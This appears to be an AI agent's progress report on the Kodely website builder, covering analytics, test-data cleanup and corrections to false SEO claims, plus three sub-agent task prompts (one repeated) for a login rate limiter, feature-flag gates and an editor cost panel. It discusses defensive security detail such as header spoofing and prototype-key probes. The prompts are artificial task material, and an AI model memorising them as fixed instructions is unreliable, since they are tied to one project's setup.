It rendered ~0.5% while true retail margin is ~89%. Anyone reading that tile would have concluded the business had no margin. Relabelled to "Meter rounding" with the reason inline and a link to the real revenue figures.

## Analytics refused to build what was asked, correctly

The board asked for MRR/ARR/churn/LTV/CAC. The agent verified the premise itself and refused four of five: no subscriptions exist, so MRR/ARR are undefined; nothing to cancel, so churn is undefined; no marketing spend or attribution is recorded anywhere, so CAC has neither numerator nor denominator. It put a "Not computed, and why" table **in the product**, not just its report.

What it built instead is more useful: **credit liability — 2,753 credits outstanding across 4 users = $5.51 of committed future model spend**, all free-granted. Realised revenue is **$0.00**; zero `stripe:` rows have ever been written.

## The editor agent caught a false statement in user-facing copy

The Stop button said *"Any files the build had already written are kept in Code."* True on the API engine — but you're running `KODELY_ENGINE=sdk`, and `agent-sdk.ts` returns **before** the loop that diffs the working directory back, so an aborted build persists nothing. It now conditions on whether the client actually observed file events.

It also found the palette could become keyboard-dead (Escape had no listener when focus was outside the dialog, since the editor unbinds its global shortcuts while open), and that **every progress line was being announced twice** — two simultaneous `aria-live` regions holding the same string.

One thing it flagged rather than fixed: the editor sidebar is `w-96` (384px) at a 380px viewport, so there's pre-existing horizontal overflow. It confirmed against `git show HEAD` that its work neither caused nor worsened it.

## Also added

An **admin nav** in the layout. Eight pages existed and almost none linked to each other — every one was reachable only by typing its URL. Ordered by what you'd reach for in an incident, not alphabetically.

Tree is green: TypeScript clean, zero lint errors. Three agents still running (sites registry, SEO batch two, blog CMS).

Build green, zero errors, zero warnings. Fifteen admin routes now exist where there was one.

## I cleaned up test data — including a leftover ADMIN account

An agent flagged fixtures another agent had left behind. I checked before deleting: **`zz-sites-probe-admin@example.invalid` had `role = ADMIN`**, plus an owner account and three projects still marked **live** — named `zz-sites-probe-phish`, `-wallet`, and `-clean`.

A dormant admin account and three live "phishing"/"wallet-drainer" fixtures are exactly what you don't want surviving in a database that might get dumped or promoted. Dry-ran the deletion first, scoped strictly to `@example.invalid` addresses, and confirmed `ModerationFinding` has no cascade so those 7 rows needed explicit removal.

Gone now. **Your database currently has no ADMIN at all** — that command is still yours to run.

## The health page diagnosed your local build failures

It didn't just count failures, it clustered them: **8 of 13 builds failed, and 6 are one incident** — `Not logged in · Please run /login`. The panel says so in as many words ("This is one incident, not 6 independent problems") and prints the fix.

The other two are the `KODELY_FOUNDATION_DIR` bug I hit earlier, and it identified the exact mechanism: unset, `lib/build-site.ts` falls back to `/home/kodely/kodely-foundation`, which on Windows resolves to `C:\home\kodely\…` — the literal EPERM string sitting in your database. That's now a standing check.

One diagnostic I hadn't thought to look for: **p50 was 167.8s for successes versus 3.2s for failures.** Failures are 5× *faster*, which means they die before the model does any work — a config problem, not a quality problem.

It also found a limit worth knowing: the imputed-cost caveat **can't be scoped to individual rows**, because `meterUsage()` maps SDK usage onto the same rate keys the API engine uses, so a `Build` row carries no engine marker. It states its count as a floor rather than pretending precision.

## The sites agent found the same class of bug twice

Three reachable 500s from prototype-chain validation — `?view=toString` and `?sort=constructor` passed guards using the `in` operator. That's the **third** independent occurrence of this exact pattern in the codebase (the audit page had it too). One was genuinely dangerous: `reason=constructor` was truthy and would have been written into the audit log as the stated justification for a takedown.

It also proved takedown properly: 200 before, 404 on all five paths after, and all four `ProjectFile` rows plus the build and the owner account intact — only `publishedAt` went null.

One volumetric warning worth acting on before this ships: **a short browsing session generated 144 audit rows**, because `site.viewed` records every render.

## PART 1 — corrections

### The credit figure (21 occurrences, 14 posts)

The 56 live posts have no repo source, so I surveyed all of them against the live site. The figure appears in **five different phrasings** — `100–150` (en dash), `100-150` (hyphen), `100 to 150` (spelled out), `in the 100–150 credit range`, `typically costs 100–150`. A single regex would have missed a third of them; a regex *rewrite* would have mangled prose. So every edit is an exact literal string, and every one I could verify against a local copy was verified before shipping.

Representative before/after (all 21 are in the file with a `note` naming the grounding):

> **`kodely-vs-rocket-new`**
> − Credits don't expire. *A typical first build runs roughly 100–150 credits, and a follow-up change is usually in the same range,* so the free tier is enough to actually build and iterate on something before you have to decide whether to pay.
> \+ Credits don't expire. *What a build costs is metered from its real model usage rather than charged as a flat fee, and a build that fails to compile is never charged at all* — so you can start building before deciding whether to pay.

> **`ai-website-builder-with-transparent-pricing`** (worst placement of the figure on the site)
> − A typical first build, the initial site generated from your description, runs roughly 100 to 150 credits.
> \+ What a build costs comes from its own measured token usage — input, output and cache — priced at the model's published rate, not from a flat per-build fee.

**I also removed every sufficiency claim derived from the number** — "enough for a first build plus several rounds of edits", "covers several real builds", "enough to build and iterate several times over". Those inherit the same bad arithmetic: at the observed 472-credit high, 750 credits is roughly one build and one edit, not several. Leaving them in would have preserved the understatement with the number deleted.

No replacement number anywhere. `estimateCredits`'s own comment is the authority: two samples is not a distribution.

### The export claim (37 occurrences, 26 posts) — gated

`app/api/projects/[id]/export/route.ts`, `lib/zip.ts` and the **Download .zip** button in `Editor.tsx` are **untracked in git**. Built, not deployed. Every "there is no zip export" sentence on kodely.me is true today.

The group will not run without `--gate export-shipped` on the command line, and the script prints why it skipped. Two of the corrections are comparison-table cells (`kodely-vs-rocket-new`, `kodely-vs-lovable`) where the current text hands the row to a competitor. One (`kodely-vs-webflow`) literally says *"the code lives inside Kodely until that export ships"* — a sentence that must not survive the deploy that makes it false.

Replacements never overclaim: the route streams the **draft source tree**, not build output, and there is still no GitHub sync, so every replacement says so.

From a checkout on the production box with `DATABASE_URL` pointed at prod:

1. **Before the deploy:** `node scripts/seo/correct-live.mjs --group credit-figure --group capability-claims` → read the dry run → `--apply`.
2. Three things to read in the output: `change` (before/after), `STALE` (live copy drifted — fix the edit, never force), `RESIDUE` (a row still matching the group's detect patterns *after* the planned edits — this is what covers the 42 live posts with no repo copy).
3. For residue: `--emit-stubs` writes `pending.generated.json` with the exact matched text as `find` and an empty `replace`. Fill them in, move them into the group file, re-run until the sweep is clean. The script exits non-zero while any stale edit or residue remains, so a clean exit code means the whole class is gone — not just the rows someone remembered.
4. **In the export deploy window, not after:** `node scripts/seo/correct-live.mjs --group export-claim --gate export-shipped --apply`.
5. `app/blog/[slug]/page.tsx` is `force-static` with `revalidate = 3600` — a corrected page takes up to an hour to change for visitors.

Guarantees: literal matches only (a stale edit changes nothing and reports), idempotent (only `bodyHtml` written, so `@updatedAt` doesn't churn), no create path and no delete path. I exercised dry-run → apply → re-run on a throwaway row in the **local** DB, then deleted the row and the test group; local table is back to its original 17.

## Verdict on the four suspect posts

All four are dishonest at the level of the keyword intent that brought the reader. Ranked by severity:

**1. `website-builder-for-dentists` — worst on the site.** It says the appointment form *"collects the request and sends it to you"*. There is no server and no mail path behind a generated site. That sentence tells a dental practice that patient appointment requests are arriving. They are not — they are discarded silently, and the patient sees a confirmation. It also instructs the reader to prompt for "a real photo" and "a map" (both impossible) and to ask for "three sample testimonials" for a real practice. Corrections written for the form claim, both instances.

**2. `website-builder-for-chiropractors`.** Same form failure, phrased as *"a genuinely good-looking, working request form"* plus *"have staff follow up on submissions"* — submissions that don't exist. Additionally its flagship example prompt asks for **four separate pages** ("Add a Services page… an About page… a Location & Hours page"), which contradicts the already-deployed `lib/agent.ts` rule *"this is a single-page app"*, and asks for 3–4 testimonials for a named practice. All three corrected.

**3. `website-builder-for-photographers`.** The most structurally dishonest, and it needs more than a sentence swap. It tells photographers the gallery *"ships with placeholder images"* and that *"after your site is live, you'll need to add your own photos yourself."* There is no path by which that ever happens — no upload, and `img-src 'self' data:` with `connect-src 'none'` blocks remote images permanently. The article's central promise is a step the product cannot perform, before or after any deploy. **My recommendation is rewrite or unpublish, not patch**: photography is the one vertical where the CSP removes the entire product. I did not write correction edits for it because there is no honest small change — the piece is 60% about a gallery that cannot exist. (I have no verbatim DB text for it either; it isn't in `seo-batch1.json`.)

**4. `build-a-booking-appointment-website-with-ai`.** Genuinely the most honest of the four about persistence — it says plainly that submissions aren't saved. It's still wrong in three ways: it recommends prompting for the form anyway ("It reads and behaves like a real booking flow"), it promises backend form delivery as *"coming in a future release"*, and it tells you to ask for testimonials and a hero background image. Corrected — the "what you get" list now leads with a link-out CTA, and the roadmap promise is removed rather than re-dated.

**Important wording note:** the working tree's `lib/agent.ts` adds "never invent facts about a real business" and "never build something that only pretends to work" — **HEAD has neither**, so they aren't deployed. Every correction replacement is deliberately phrased to be true before *and* after that ships: it states what a form on the site **does** (nothing), never what the builder currently agrees to draw.

Beyond the four, the survey turned up the same class elsewhere, which I did not have verbatim text to fix: `website-builder-for-restaurants` and `website-builder-for-accountants` both claim *"a multi-page app with working navigation"*; `website-builder-for-interior-designers` and `-restaurants` both say you swap placeholder visuals for your own photography afterwards; `ai-website-generator-from-a-description` claims *"a contact form with working input state"* with no backend caveat at all. The `capability-claims` detect patterns catch all of these on a prod run.

## PART 2 — 17 new articles

Every capability claim is grounded in code. All 34 files pass `validate.mjs` (0 failing, 0 warnings) and `check-claims.mjs` (0 errors).

**Guides — buildable verticals, one page, link-out CTAs:** coffee shop, food truck, gym/studio, cleaning business, wedding, event, nonprofit, band/musician, coming-soon page. Plus two how-tos: `how-to-add-a-booking-button-to-an-ai-built-site` and `starting-from-a-template-or-a-blank-prompt`.

**Explainers:** `why-ai-built-sites-have-no-contact-form`, `why-an-ai-builder-should-leave-blanks`, `where-the-icons-in-an-ai-built-site-come-from`, `what-a-published-ai-site-is-allowed-to-load`.

**Comparisons (only factual about Kodely's own side, no competitor claims at all):** `one-page-website-vs-a-link-in-bio-page`, `a-website-vs-a-facebook-page-for-a-local-business`.

Grounding by claim:
- CSP directives quoted verbatim → `app/api/site/[slug]/[[...path]]/route.ts` `SANDBOX_CSP`
- no font, not even base64 → the `font-src` paragraph in `lib/agent.ts` SYSTEM
- single page → SYSTEM "Multi-page: this is a single-page app"
- no forms / mailto / tel / link-out → no backend in `lib/foundation.ts` + `connect-src 'none'`

- templates are prompts not layouts, and are written never to ask for a form/cart/second page/remote image/web font → the header comment and `description` fields in `lib/templates.ts` (23 templates)

**No per-build credit figure appears anywhere in the 17. No article mentions zip export at all** — mentioning it is false today and omitting it stays true after the deploy, so it was the only stable choice.

1. **13 of the 17 pre-existing `content/seo` articles claim the zip download exists.** They are not live yet, so this isn't a public error — but seeding them before the export route deploys publishes 13 false claims. `node scripts/seo/check-claims.mjs` (no flags) lists them and exits 1. **Do not run `seed.mjs` for real until export ships**, or edit those sentences first.

All 17 existing articles reference Enhance; 12 of my 17 reference bracketed placeholders. Three of mine depend on undeployed code outright: `where-the-icons-in-an-ai-built-site-come-from` (needs `lib/assets`), `starting-from-a-template-or-a-blank-prompt` (needs `lib/templates` + `/templates`), `why-an-ai-builder-should-leave-blanks` (needs the new SYSTEM). **The whole of `content/seo` ships with that deploy or not at all.**
3. **Topics I refused:** anything needing a backend, form delivery, e-commerce, image upload, multi-page routing, custom domains, relaxed CSP or `font-src`. Specifically I did not write the obvious high-volume ones — photographer sites, online stores, contact-form guides, "add analytics to your AI site", "connect your domain".
4. **`website-builder-for-photographers` needs a rewrite decision from you**, not a patch. See the verdict above.
5. **Where the corrections can't reach:** 42 of the 56 live posts have no repo copy. For 12 of the slugs I wrote literal edits from byte-verified quotes off the live site; if any is off by a character the script reports `STALE` and changes nothing. The `detect` sweep plus `--emit-stubs` is the intended path for the remainder, and it runs against the real rows where the exact text actually lives.

All twelve agents from this round are done. Build green, TypeScript clean, **zero lint errors and zero warnings**.

## The CMS is the fix for the dentist problem

That's the useful convergence here. The correction script (`correct-live.mjs`) is the bulk instrument, but `/admin/content` is now the surface where a human reads the flagged sentence in context and decides — which is what I asked for instead of a find-and-replace across 56 live pages.

It reuses the existing validator by **importing `validateAll` from `scripts/seo/validate.mjs` directly** rather than writing a second rule set, and it refuses to save invalid HTML — which matters because `bodyHtml` goes into a public page through `dangerouslySetInnerHTML` with no sanitisation. It rejected `<script>`, a second `<h1>`, unclosed tags, absolute `src`, `onclick=`, and eight other adversarial drafts.

It also does something I'd have missed: calls `revalidatePath` on save. The post page is `force-static` with `revalidate 3600`, so without it a correction would sit invisible for an hour — on a panel whose entire purpose is fixing something wrong that's live *right now*.

I wired the audit logging it couldn't add itself (`lib/` was outside its scope). `blog_post.updated` is now in the vocabulary with a new `content` surface, recorded **after** the write so a row can never assert a change that failed to apply. `BlogPost` keeps no version history, so this is the only record that the live text used to say something else.

One honest detail from its report worth repeating: its stale-claim detector found **one match locally and it was a false positive** — an article containing the phrase "no export negotiation". Its own comment on that: the detector finds candidates, a human decides. That's the design working, not failing.

## Where the board stands

**Audit coverage is complete** — all 16 admin surfaces log, and the vocabulary has one remaining `emittedBy: null` entry rather than the fifteen it started with.

**Fifteen admin routes** now exist where there was one, all behind a nav, all with per-page authorization on top of the layout gate.

Nothing is deployed. The blocking sequence hasn't changed: `prisma db push` on staging and prod, then the code, then the **ungated** content corrections — and the dentist/chiropractor fix doesn't depend on the export deploy, so it can go first and should.

input.prompt:
Work in C:\Users\edmem\kodely-prod (Next.js 16 + Prisma, an AI website builder called Kodely).

TASK: make the pre-auth rate limiter durable. It currently works, but only in process memory.

## Context — read this first
`lib/rate-limit.ts` was recently extended with pre-auth limiters for login and signup (`checkLoginRateLimit`, `checkSignupRateLimit`, `noteLoginSuccess` or similarly named — read the file). They are correct in design but **in-memory**, which the author flagged as the single most valuable follow-up:
- resets on every deploy or restart, so it **fails open** across that boundary
- multiplies by process count if the app ever runs multi-process

The reason it was in-memory: a failed login writes nothing to the database, and the schema was off-limits at the time. **That constraint is now lifted.**

## Schema now exists — use it, do not change it
`LoginAttempt` in prisma/schema.prisma (READ ONLY, already migrated and pushed):
- `id, key, scope, createdAt`
- `key` is the bucket, **already hashed by the caller** — an IP, or a salted digest of an email. Never a plaintext address.
- `scope` is `"ip" | "account" | "signup"`
- indexes: `[scope, key, createdAt]` for the count-in-window query, `[createdAt]` for pruning

## What to do
1. **Read `lib/rate-limit.ts` in full and preserve its existing behaviour exactly.** The current design is deliberate and each piece has a reason — do not "simplify" any of it away:
   - **Consume-then-refund, not count-failures.** Counting only failures means the write happens after `verifyPassword` resolves, so a thousand concurrent guesses all pass the check before the first failure records. Every attempt must consume synchronously.
   - **A correct password clears the account bucket and refunds one hit on the IP bucket** — so a NAT'd office isn't spent by people signing in correctly, while an attacker who owns one valid account can't repeatedly log into it to wipe guesses made against others.
   - **Both login buckets (IP and account) are checked before either is consumed.**
   - **`cf-connecting-ip` only.** `x-forwarded-for`'s first entry is attacker-controlled because Cloudflare appends rather than replaces; the last entry is our own nginx. Do not change this.
   - **Fails closed** when no `cf-connecting-ip` is present.
2. **Move the counters to `LoginAttempt`**, keeping the exported function signatures unchanged so the routes need no edits.
3. **Pruning.** Rows accumulate forever otherwise. Decide where this happens and justify it: opportunistically inside the limiter, or as a rule in `lib/retention.ts` (READ it — a retention job already exists with a `--dry-run` default and four rules). Do not add a rule to that file if it is outside your scope; say so instead.
4. **Performance matters here.** This runs on every login attempt including the failing ones an attacker generates. Make sure the count query hits the index, and think about what happens under a burst.
5. **The refund path is the tricky part with a row-based counter** — you cannot "refund" a row that represents an event that happened. Work out the right semantics (delete the row? record a compensating marker? clear the account bucket by deleting its rows?) and explain your reasoning.

## Verify — behaviour, not inspection
Against the local Postgres: prove the caps trip at the right count, that the window rolls rather than being a flat block, that a successful login clears the account bucket and refunds IP, that the two login buckets compose, and — the new part — **that the counter survives a simulated process restart** (that is the entire point of this change). Clean up every row you create.

## Constraints
- YOU MAY ONLY EDIT: `lib/rate-limit.ts`.
- DO NOT modify: prisma/schema.prisma, any other file under lib/, app/** (the auth routes must need no changes — if they do, you have changed a signature and should not have), proxy.ts, deploy.sh, .env, package.json.
- Never store a plaintext email or a raw password anywhere.
- No new npm dependencies. Do NOT run `npm run build`, `git commit`, `git push`, or `deploy.sh`.
- **HARD GATE: `npx tsc --noEmit` and `npx eslint app lib components` must BOTH be clean — currently zero errors AND zero warnings. Keep it there.**

## Report back
Your refund semantics and why, where pruning happens, the query plan/index you rely on, what you proved (especially the restart-survival test), and anything about the original in-memory behaviour you could not preserve exactly.

Work in C:\Users\edmem\kodely-prod (Next.js 16 + Prisma, an AI website builder called Kodely).

TASK: make the pre-auth rate limiter durable. It currently works, but only in process memory.

## Context — read this first
`lib/rate-limit.ts` was recently extended with pre-auth limiters for login and signup (`checkLoginRateLimit`, `checkSignupRateLimit`, `noteLoginSuccess` or similarly named — read the file). They are correct in design but **in-memory**, which the author flagged as the single most valuable follow-up:
- resets on every deploy or restart, so it **fails open** across that boundary
- multiplies by process count if the app ever runs multi-process

The reason it was in-memory: a failed login writes nothing to the database, and the schema was off-limits at the time. **That constraint is now lifted.**

## Schema now exists — use it, do not change it
`LoginAttempt` in prisma/schema.prisma (READ ONLY, already migrated and pushed):
- `id, key, scope, createdAt`
- `key` is the bucket, **already hashed by the caller** — an IP, or a salted digest of an email. Never a plaintext address.
- `scope` is `"ip" | "account" | "signup"`
- indexes: `[scope, key, createdAt]` for the count-in-window query, `[createdAt]` for pruning

## What to do
1. **Read `lib/rate-limit.ts` in full and preserve its existing behaviour exactly.** The current design is deliberate and each piece has a reason — do not "simplify" any of it away:
   - **Consume-then-refund, not count-failures.** Counting only failures means the write happens after `verifyPassword` resolves, so a thousand concurrent guesses all pass the check before the first failure records. Every attempt must consume synchronously.
   - **A correct password clears the account bucket and refunds one hit on the IP bucket** — so a NAT'd office isn't spent by people signing in correctly, while an attacker who owns one valid account can't repeatedly log into it to wipe guesses made against others.
   - **Both login buckets (IP and account) are checked before either is consumed.**
   - **`cf-connecting-ip` only.** `x-forwarded-for`'s first entry is attacker-controlled because Cloudflare appends rather than replaces; the last entry is our own nginx. Do not change this.
   - **Fails closed** when no `cf-connecting-ip` is present.
2. **Move the counters to `LoginAttempt`**, keeping the exported function signatures unchanged so the routes need no edits.
3. **Pruning.** Rows accumulate forever otherwise. Decide where this happens and justify it: opportunistically inside the limiter, or as a rule in `lib/retention.ts` (READ it — a retention job already exists with a `--dry-run` default and four rules). Do not add a rule to that file if it is outside your scope; say so instead.
4. **Performance matters here.** This runs on every login attempt including the failing ones an attacker generates. Make sure the count query hits the index, and think about what happens under a burst.
5. **The refund path is the tricky part with a row-based counter** — you cannot "refund" a row that represents an event that happened. Work out the right semantics (delete the row? record a compensating marker? clear the account bucket by deleting its rows?) and explain your reasoning.

## Verify — behaviour, not inspection
Against the local Postgres: prove the caps trip at the right count, that the window rolls rather than being a flat block, that a successful login clears the account bucket and refunds IP, that the two login buckets compose, and — the new part — **that the counter survives a simulated process restart** (that is the entire point of this change). Clean up every row you create.

## Constraints
- YOU MAY ONLY EDIT: `lib/rate-limit.ts`.
- DO NOT modify: prisma/schema.prisma, any other file under lib/, app/** (the auth routes must need no changes — if they do, you have changed a signature and should not have), proxy.ts, deploy.sh, .env, package.json.
- Never store a plaintext email or a raw password anywhere.
- No new npm dependencies. Do NOT run `npm run build`, `git commit`, `git push`, or `deploy.sh`.
- **HARD GATE: `npx tsc --noEmit` and `npx eslint app lib components` must BOTH be clean — currently zero errors AND zero warnings. Keep it there.**

## Report back
Your refund semantics and why, where pruning happens, the query plan/index you rely on, what you proved (especially the restart-survival test), and anything about the original in-memory behaviour you could not preserve exactly.

TASK: wire the feature-flag kill switches into their call sites. The flag system is built, verified and admin-manageable — but **nothing checks it**, so today it is an elaborate switch connected to nothing.

## Read first
`lib/flags.ts` (READ ONLY — do not edit). It exports `isEnabled(key, subjectId?)` and a closed `FLAGS` constant. Key properties, all proven by its author against the real database:
- 10s per-process cache; a flip takes effect within the TTL.
- Bucketing is stable per user and decorrelated across flags (`sha256("${subjectId}:${key}")`).

| File | Where | Flag |
|---|---|---|
| `app/api/generate/route.ts` | after the project lookup, **before** the balance and spend-cap checks | `generation.enabled`, subject `user.id` |
| `app/api/projects/[id]/publish/route.ts` | after the project lookup, before the publish rate limit and moderation | `publishing.enabled` |
| `app/api/auth/signup/route.ts` | before `db.user.create` | `signups.enabled` |
| `app/api/auth/google/callback/route.ts` | before `db.user.create`, **first-time-user branch only** — an existing user signing in must be unaffected | `signups.enabled` |
| `app/api/rewards/social/claim/route.ts` | before `grantReward` | `rewards.enabled` |
| `app/api/rewards/discord/callback/route.ts` | before `grantReward` | `rewards.enabled` |
| `app/api/enhance/route.ts` | after `getCurrentUser` | `feature.prompt_enhance` |

Position matters: a killed switch must refuse **before** any spend path, any credit grant, or any model call is entered. Verify each position yourself against the current code rather than trusting the line numbers — several of these files have changed recently.

## Two things the flag author flagged for a decision
1. **`signups.enabled` and the Google callback are anonymous** — no subject id, so `isEnabled` returns false for any partial rollout. These must be operated at 100% with the switch, never a percentage. Make sure the code makes that safe and obvious.
2. **`feature.sdk_engine` is the hard one. Think before you build it.** The engine is currently selected by the `ENGINE` env var at `lib/agent.ts` (READ ONLY), and `RunOptions` carries no user id, so bucketing is impossible inside `runAgent`. The suggested site is the `runAgent(` call in the generate route. **You must reconcile it with the existing env var rather than adding a second, contradictory source of truth.** If you conclude the two cannot be reconciled cleanly without editing `lib/agent.ts` — which you may not — then DO NOT wire it: say so and explain what the right shape would be. A half-wired engine selector is worse than none.

## Response behaviour
When a switch is off, the user must get an honest, specific message — not a generic 500 and not a lie about why. Read how each route already returns errors and match it. A killed generation should not read as "you're out of credits".

## Constraints
- YOU MAY ONLY EDIT the seven route files listed above.
- DO NOT modify: prisma/schema.prisma, anything under lib/ (including flags.ts, agent.ts, credits.ts, rate-limit.ts), app/admin/**, app/projects/**, app/dashboard/**, components/**, proxy.ts, deploy.sh, .env, package.json.
- Do not change any existing behaviour other than adding the gate. Preserve the audit-logging, rate-limiting, moderation, event-tracking and credit logic already in these files exactly.
- No new npm dependencies. Do NOT run `npm run build`, `git commit`, `git push`, or `deploy.sh`.
- **HARD GATE: `npx tsc --noEmit` and `npx eslint app lib components` must BOTH be clean — currently zero errors AND zero warnings.**
- Verify against the local Postgres: flip a flag off, confirm the route refuses with the right message and that nothing was written (no build row, no user, no credit grant); flip it back, confirm normal operation. Clean up every row and flag you create.

## Report back
Each site wired with its exact position and why, your decision on `feature.sdk_engine` with full reasoning, the refusal message for each, what you proved (including that a refused request writes nothing), and anything you declined to wire.

input.description: Plan-before-spend and SEO panel
input.prompt:
Work in C:\Users\edmem\kodely-prod (Next.js 16 + Prisma, an AI website builder called Kodely).

BUILD: two Builder/Editor features. Bundled because both touch `app/projects/[id]/Editor.tsx` and parallel edits to that file would collide.

## 1. Plan-before-spend — closing a claim the board wrongly marked shipped
A board card reads "✅ SHIPPED — MVP: transparent credit meter + pre-generation cost estimate". **Half of that is false.** `estimateCredits()` exists in `lib/credits.ts` and has **zero callers** — nothing shows anyone a cost before they spend. It was found when an SEO article claimed "you see an estimated cost range before you spend" and the claim could not be grounded.

Build the honest version:
- Before a build runs, show what it is likely to cost. `estimateCredits(kind)` returns `{low, high}` — 120–550 for a create, 60–300 for an edit.
- **Present it as a wide bracket, never a precise figure.** Read that function's own comment: measurements are 144 and 472 credits, a threefold spread across two samples, which it says plainly is not a distribution. Do not compute an average and present it as a prediction. If the estimate would exceed the user's remaining balance, say so *before* they press the button — that is the whole point.
- The user's own measured average (`averageBuildCredits`) is more honest than the global range once they have history. `components/CreditMeter.tsx` (READ ONLY) already does this and gates on a build count so it never presents a global constant as "your average" — follow the same rule.

## 2. User-facing SEO / meta panel
Generated sites get real `<title>`, meta description and OG tags — the builder is prompted to write them (`lib/agent.ts` SYSTEM, READ ONLY) and `lib/site-seo.ts` (READ ONLY) applies a backstop plus `robots.txt` and `sitemap.xml`. **The user cannot see or edit any of it**, so a wrong title discovered after publishing means re-prompting the model and paying for a build.

Build a panel showing the current title / description / OG values for the project, and let the user edit them directly without a generation. Read `lib/site-seo.ts` carefully first to understand what is stored where and what the backstop does, and read `app/api/projects/[id]/publish/route.ts` to see when values are applied. **If saving these requires an API route outside your scope, do not create one — describe exactly what you need in your report.**

## Scope — YOU MAY ONLY CREATE/EDIT FILES UNDER `app/projects/[id]/`
Everything else is off limits. READ anything.

## Do not regress
`Editor.tsx` now carries: live progress narration, the building overlay, thumbs-up/down rating, zip download, the Enhance flow, low-credit warning, Stop/cancel, device-frame preview, a Cmd/Ctrl-K command palette, and connection-loss recovery. **All of it must keep working.** Read the file fully before editing.

Specific traps already hit in this file, do not repeat them:
- Two `aria-live` regions holding the same string made screen readers announce every progress line twice.
- The command palette became keyboard-dead when focus was outside the dialog — Escape needs a window-level net because the editor unbinds its globals while the palette is open.
- Copy must not claim engine behaviour that isn't true: on the live SDK engine an aborted build persists **nothing**, because `lib/agent-sdk.ts` returns before the diff loop.

## Constraints
- Preserve the accessibility bar: visible `focus-visible:` states, real labels, `aria-*` on stateful controls, no keyboard traps. Note a known pre-existing issue: the sidebar is `w-96` (384px) so there is horizontal overflow at 380px — do not make it worse, and do not attempt the responsive rework.
- **No new white text on the brand gradient** — fails contrast (worst 1.81:1), a known accepted issue.
- Match the existing idiom: `rounded-md`/`rounded-lg`, `text-xs`/`text-sm`, monochrome, `border-black/10 dark:border-white/10`.
- DO NOT modify: prisma/schema.prisma, anything under lib/, app/api/**, app/dashboard/**, app/settings/**, app/admin/**, app/globals.css, components/**, proxy.ts, deploy.sh, .env, package.json.
- No new npm dependencies. Do NOT run `npm run build`, `git commit`, `git push`, or `deploy.sh`.
- **HARD GATE: `npx tsc --noEmit` and `npx eslint app lib components` must BOTH be clean — currently zero errors AND zero warnings.**
- A dev server may be on :3003. The Browser pane may not composite frames, so verify DOM and computed styles programmatically rather than by screenshot.

## Report back
Both features, exactly how you framed the cost estimate and what you refused to state, anything you needed outside your scope, what you verified in the running app, and confirmation that the existing editor features still work.
